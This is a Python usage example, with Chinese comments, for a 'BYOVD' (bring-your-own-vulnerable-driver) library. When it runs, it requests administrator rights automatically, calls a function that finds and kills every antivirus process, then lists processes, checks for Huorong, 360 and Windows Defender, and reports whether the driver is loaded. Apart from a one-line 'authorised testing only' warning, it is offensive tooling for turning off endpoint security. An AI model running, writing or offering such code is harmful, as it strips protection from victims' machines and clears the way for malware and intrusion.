#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BYOVD Library 使用示例

⚠️ 安全警告：本示例仅供授权的安全测试使用。
"""

import sys
import os

# 添加库路径
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# 导入库函数，包括自动提权和一键杀软功能
from byovd_lib import BYOVD, request_elevation, kill_all_av

# 自动请求管理员权限
request_elevation()


def main():
    """主函数"""
    print("=" * 50)
    print("BYOVD Library 使用示例")
    print("=" * 50)
    print()
    
    # 一键秒杀所有杀毒软件
    print("[*] 正在扫描并终结杀毒软件...")
    print()
    results = kill_all_av(verbose=True)
    print()
    
    with BYOVD() as byovd:
        # 1. 列出进程
        print("[1] 进程列表 (前 10 个)")
        print("-" * 40)
        for pid, name in byovd.list_processes()[:10]:
            print(f"  PID: {pid}, Name: {name}")
        print()
        
        # 2. 检测杀毒软件
        print("[2] 杀毒软件检测")
        print("-" * 40)
        av_list = byovd.detect_av()
        if av_list:
            for pid, name, av in av_list:
                print(f"  {av}: {name} (PID: {pid})")
        else:
            print("  未检测到杀毒软件 (已全部终结)")
        print()
        
        # 3. 检查特定杀毒软件
        print("[3] 检查特定杀毒软件")
        print("-" * 40)
        if byovd.has_av("火绒"):
            print("  检测到火绒")
        elif byovd.has_av("360"):
            print("  检测到 360")
        elif byovd.has_av("Defender"):
            print("  检测到 Windows Defender")
        else:
            print("  未检测到常见杀毒软件")
        print()
        
        # 4. 驱动状态
        print("[4] 驱动状态")
        print("-" * 40)
        print(f"  加载状态：{'已加载' if byovd.is_driver_loaded() else '未加载'}")
        print()
    
    print("=" * 50)
    print("示例执行完成")
    print("=" * 50)


if __name__ == "__main__":
    main()